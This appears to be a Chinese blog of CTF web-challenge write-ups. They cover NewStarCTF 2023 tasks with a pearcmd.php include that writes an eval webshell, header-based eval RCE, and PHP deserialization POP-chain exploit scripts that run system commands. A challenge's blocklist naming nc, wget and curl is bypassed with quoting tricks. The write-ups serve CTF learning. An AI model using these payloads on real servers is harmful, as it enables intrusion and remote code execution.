<h1 id="NewStarCTF-2023-公开赛道-Upload-again"><a href="#NewStarCTF-2023-公开赛道-Upload-again" class="headerlink" title="[NewStarCTF 2023 公开赛道]Upload again!"></a>[NewStarCTF 2023 公开赛道]Upload again!</h1><p>对文件后缀和文件内容存在一定情况的过滤</p>
<p>配合.htaccess文件上传以下木马即可</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704145512842.png" class="" title="image-20250704145512842">

<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704145620831.png" class="" title="image-20250704145620831">

<h1 id="NewStarCTF-2023-公开赛道-游戏高手"><a href="#NewStarCTF-2023-公开赛道-游戏高手" class="headerlink" title="[NewStarCTF 2023 公开赛道]游戏高手"></a>[NewStarCTF 2023 公开赛道]游戏高手</h1><p>查看源代码发现需要gameScore的值大于一定的数才给flag</p>
<p>控制台修改成功</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704151345043.png" class="" title="image-20250704151345043">

<h1 id="NewStarCTF-2023-公开赛道-Include-🍐"><a href="#NewStarCTF-2023-公开赛道-Include-🍐" class="headerlink" title="[NewStarCTF 2023 公开赛道]Include 🍐"></a>[NewStarCTF 2023 公开赛道]Include 🍐</h1><p>根据提示读取phpinfo.php文件搜索flag</p>
<p>给出提示查看register_argc_argv</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704152432301.png" class="" title="image-20250704152432301">

<p>发现上网查询资料发现register_argc_argv可以进行rce</p>
<p>通过调用pearcmd.php进行rce</p>
<p>register_argc_argv的两个特点</p>
<p>1.&amp;符无发分割参数，真正能分割参数的是加号</p>
<p>2.等号无法赋值，而是会直接被传进去当作参数</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/2de99d32-2d60-43af-8ee5-0111fdc52f38.png" class="" title="image-20211101074033767.png">

<p>?+config-create+&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;<?=@eval($_POST['cmd']);?>+&#x2F;tmp&#x2F;test.php</p>
<p>模拟pear指令创建一个test.php的木马文件</p>
<p>参考文章<a target="_blank" rel="noopener" href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">Docker PHP裸文件本地包含综述 - 跳跳糖</a></p>
<h1 id="NewStarCTF-2023-公开赛道-R-C-E-1"><a href="#NewStarCTF-2023-公开赛道-R-C-E-1" class="headerlink" title="[NewStarCTF 2023 公开赛道]R!!C!!E!!"></a>[NewStarCTF 2023 公开赛道]R!!C!!E!!</h1><p>git文件泄露</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rcebo0g1pop.php </span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if (&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])) &#123;</span><br><span class="line">  if(!preg_match(&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;,$_GET[&#x27;star&#x27;]))&#123;</span><br><span class="line">    eval($_GET[&#x27;star&#x27;]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>无参数rce</p>
<img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250704201307267.png" class="" title="image-20250704201307267">

<p>对请求头进行修改即可</p>
<p>eval(pos(array_reverse(getallheaders()))); </p>
<h1 id="NewStarCTF-2023-公开赛道-Unserialize？"><a href="#NewStarCTF-2023-公开赛道-Unserialize？" class="headerlink" title="[NewStarCTF 2023 公开赛道]Unserialize？"></a>[NewStarCTF 2023 公开赛道]Unserialize？</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// Maybe you need learn some knowledge about deserialize?</span><br><span class="line">class evil &#123;</span><br><span class="line">  private $cmd;</span><br><span class="line"></span><br><span class="line">  public function __destruct()</span><br><span class="line">  &#123;</span><br><span class="line">    if(!preg_match(&quot;/cat|tac|more|tail|base/i&quot;, $this-&gt;cmd))&#123;</span><br><span class="line">      @system($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unserialize($_POST[&#x27;unser&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">直接序列化evil即可</span><br><span class="line"></span><br><span class="line">注意private属性需要在前后加入%00</span><br><span class="line"></span><br><span class="line">unser=O:4:&quot;evil&quot;:1:&#123;s:9:&quot;%00evil%00cmd&quot;;s:35:&quot;ca\t /th1s_1s_fffflllll4444aaaggggg&quot;;&#125;</span><br><span class="line"></span><br><span class="line">使用\绕过正则即可</span><br></pre></td></tr></table></figure>



<h1 id="NewStarCTF-2023-公开赛道-R-C-E-2"><a href="#NewStarCTF-2023-公开赛道-R-C-E-2" class="headerlink" title="[NewStarCTF 2023 公开赛道]R!!!C!!!E!!!"></a>[NewStarCTF 2023 公开赛道]R!!!C!!!E!!!</h1><img src="/2025/07/10/buu%E5%88%B7%E9%A2%98/image-20250705095556099.png" class="" title="image-20250705095556099">

<p>反序列化加rce</p>
<p>实例化对象触发 __destruct之后再触发    tostring </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a = new minipop;</span><br><span class="line">$b = new minipop;</span><br><span class="line">$b -&gt; qwejaskdjnlka=$a;</span><br></pre></td></tr></table></figure>

<p>通过单引号绕过用tee将指令执行结果输出</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /flag_is_h3eeere | t&#x27;&#x27;ee 1</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee 1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> minipop;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> minipop;</span><br><span class="line"><span class="variable">$b</span> -&gt; qwejaskdjnlka=<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>

<h1 id="NewStarCTF-2023-公开赛道-POP-Gadget"><a href="#NewStarCTF-2023-公开赛道-POP-Gadget" class="headerlink" title="[NewStarCTF 2023 公开赛道]POP Gadget"></a>[NewStarCTF 2023 公开赛道]POP Gadget</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this</span>-&gt;name))&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$vars</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">end</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">getStr</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">end</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;handle-&gt;log);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>发现在whitegod中可以进行rce</p>
<p>构造pop链begin——&gt;then—-&gt;super—-&gt;handle—-&gt;ctf—–&gt;whitegod</p>
<p>pop链</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Begin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pop</span>=<span class="keyword">new</span> <span class="title class_">Begin</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name=<span class="keyword">new</span> <span class="title class_">Then</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func=<span class="keyword">new</span> <span class="title class_">Super</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func-&gt;obj=<span class="keyword">new</span> <span class="title class_">Handle</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func-&gt;obj-&gt;obj=<span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;name-&gt;func-&gt;obj-&gt;obj-&gt;handle=<span class="keyword">new</span> <span class="title class_">WhiteGod</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>);</span><br></pre></td></tr></table></figure>

<h1 id="NewStarCTF-2023-公开赛道-More-Fast"><a href="#NewStarCTF-2023-公开赛道-More-Fast" class="headerlink" title="[NewStarCTF 2023 公开赛道]More Fast"></a>[NewStarCTF 2023 公开赛道]More Fast</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">      (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>有一个gc回收机制，所有要在触发前利用die提前停止</p>
<p>另外PHP 的特性：<code>die(object)</code> 会隐式调用 <code>__toString()</code></p>
<p>crypto中有未知属性good会调用get</p>
<p>在crypto中会调用函数触发invoke</p>
<p>pwn中的evil为web中的对象</p>
<p>所有pop链应从start—&gt;crypto—&gt;reverse—&gt;pwn—&gt;web</p>
<p>最终exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;cat 